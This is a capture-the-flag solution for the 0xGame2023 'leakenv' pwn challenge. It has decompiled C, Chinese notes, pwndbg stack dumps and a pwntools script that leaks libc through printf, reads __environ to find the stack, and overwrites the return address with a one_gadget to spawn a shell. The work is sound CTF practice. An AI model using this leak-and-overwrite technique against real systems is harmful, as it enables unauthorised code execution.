"""0xGame2023 Week2 environ
int __cdecl main(int argc, const char **argv, const char **envp)
{
  void *buf[2]; // [rsp+0h] [rbp-10h] BYREF

  buf[1] = (void *)__readfsqword(0x28u);
  bufinit(argc, argv, envp);
  printf("Here's your gift: %p\n", &printf);
  puts("You have a chance to arbitrary read 8 bytes.");
  printf("Where do you want to read?");
  __isoc99_scanf("%p", buf);
  printf("Here you are: ");
  write(1, buf[0], 8uLL);
  putchar(10);
  puts("Now show me your magic.");
  printf("Where do you want to place it?");
  __isoc99_scanf("%p", buf);
  puts("Now place it.");
  read(0, buf[0], 0x30uLL);
  printf("Good luck!");
  return 0;
}

用printf的libc，得到environ的地址，然后他给了一个打印，
2. 把environ的地址填上去就可以看到一个环境变量的栈地址
pwndbg> tel  0x7fa5e8ef2600
00:0000│ rsi 0x7fa5e8ef2600 (environ) —▸ 0x7fffb9ff14a8 —▸ 0x7fffb9ff34b8 ◂— 'COMMAND_NOT_F
OUND_INSTALL_PROMPT=1'

3.再根据这个栈地址动调偏移，他第二个read是任意写，你算rbp到那个环境变量的偏移，然后覆盖rbp就行
pwndbg> tel 0x7fffb9ff14a8 # 栈上地址为0x7fffb9ff14a8
00:0000│  0x7fffb9ff14a8 —▸ 0x7fffb9ff34b8 ◂— 'COMMAND_NOT_FOUND_INSTALL_PROMPT=1'
01:0008│  0x7fffb9ff14b0 —▸ 0x7fffb9ff34db ◂— 'DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user
/1000/bus'

$ret_rsp =  0x7fffb9ff13a8 = 0x7fffb9ff14a8 - 0x100
4.覆盖rbp以后的0x30个字节就行 或 直接 one_gadget


pwndbg> stack
00:0000│ rsp 0x7ffd354f2340 —▸ 0x7fbfee9de600 (environ) —▸ 0x7ffd354f2458 —▸ 0x7ffd354f44b8
 ◂— 'COMMAND_NOT_FOUND_INSTALL_PROMPT=1'
01:0008│     0x7ffd354f2348 ◂— 0x6c740223839c3f00
02:0010│ rbp 0x7ffd354f2350 ◂— 0x0
03:0018│     0x7ffd354f2358 —▸ 0x7fbfee813083 (__libc_start_main+243) ◂— mov edi, eax ;  -- ret = rbp + 8
0x7ffd354f2358 - ret = 0x100
"""
from pwn import *

context(log_level='debug', arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])

# io = process("leakenv")
# gdb.attach(io.pid, 'b*$rebase(0x1318)\nc')
io = gdb.debug('./leakenv', 'b*$rebase(0x1318)\nc')  # type: process
# io=remote("8.130.35.16",52003)
elf = ELF("leakenv")
libc = ELF("libc.so.6")
# pause()

io.recvuntil(b"gift: ")
leak_addr = int(io.recv(14), 16) - libc.sym[b"printf"]
print("leak_addr: ", hex(leak_addr))

environ = leak_addr + libc.sym[b"__environ"]
print("environ: ", hex(environ))

io.sendlineafter(b"read?", hex(environ))
io.recvuntil(b"are: ")
stack_addr = u64(io.recv(7).ljust(8, b"\x00"))
print("stack_addr: ", hex(stack_addr)) # environ_addr in stack

ret_addr = stack_addr - 0x100

io.sendlineafter(b"it?", hex(ret_addr))
ogg = leak_addr + 0xe3b01

io.sendafter(b"it.\n", p64(ogg))

io.interactive()

# 0xe3afe execve("/bin/sh", r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe3b01 execve("/bin/sh", r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe3b04 execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
